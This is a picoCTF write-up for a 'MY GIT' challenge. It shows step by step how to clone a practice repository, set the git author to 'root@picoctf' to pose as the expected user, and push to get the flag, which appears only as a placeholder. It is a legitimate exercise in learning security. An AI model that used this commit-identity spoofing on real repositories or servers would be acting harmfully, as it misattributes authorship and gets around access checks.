# 🔐 picoCTF Write-Up: MY GIT Challenge

📖 Full Blog: https://medium.com/@ashishpathak1205/picoctf-write-up-my-git-challenge-custom-git-server-exploitation-8fb25f0b11d4

---

## 🧩 Challenge Details

**Author:** Darkraicg492  

**Description:**  
I have built my own Git server with my own rules! Clone the repository and follow the instructions to retrieve the flag.

**Connection Command:**
```bash
git clone ssh://git@foggy-cliff.picoctf.net:58461/git/challenge.git

🎯 Objective
Clone the repository
Analyze the files
Understand the rules
Perform required Git operations
Retrieve the flag
⚠️ Key Concept

This challenge is based on Git identity validation.

The server checks:

user.name
user.email

If they match expected values → flag is returned after push.

🛠️ Step-by-Step Solution

🔹 Step 1: Clone the Repository

git clone ssh://git@foggy-cliff.picoctf.net:58461/git/challenge.git
cd challenge

Reason: Access the challenge files.

🔹 Step 2: Check Files

ls
cat README.md

Reason: Understand instructions.

🔹 Step 3: Inspect Git Configuration

cat .git/config

Reason: Check branch and remote details.

🔹 Step 4: Create Required File

touch flag.txt

Reason: Required file for submission.

🔹 Step 5: Configure Git Identity

git config user.name "root"
git config user.email "root@picoctf"

Reason: Impersonate expected user.

🔹 Step 6: Add, Commit and Push

git add .
git commit -m "Added flag file"
git push origin master

Reason: Trigger server validation.

⚙️ Final Command Flow
git clone ...
cd challenge
touch flag.txt
git config user.name "root"
git config user.email "root@picoctf"
git add .
git commit -m "exploit"
git push origin master
🏁 Flag
picoCTF{your_flag_here}
🧠 Key Learnings
Git identity can be manipulated
Importance of .git/config
Understanding Git workflow
Server-side validation logic
💡 Real-World Relevance
Misconfigured Git servers
CI/CD pipeline abuse
Identity spoofing attacks
Insider threat scenarios
🚀 Conclusion

This challenge shows that Git is not just a version control tool—it can also be a security risk if identity validation is weak.

👉 Understanding tools deeply is more powerful than brute force.
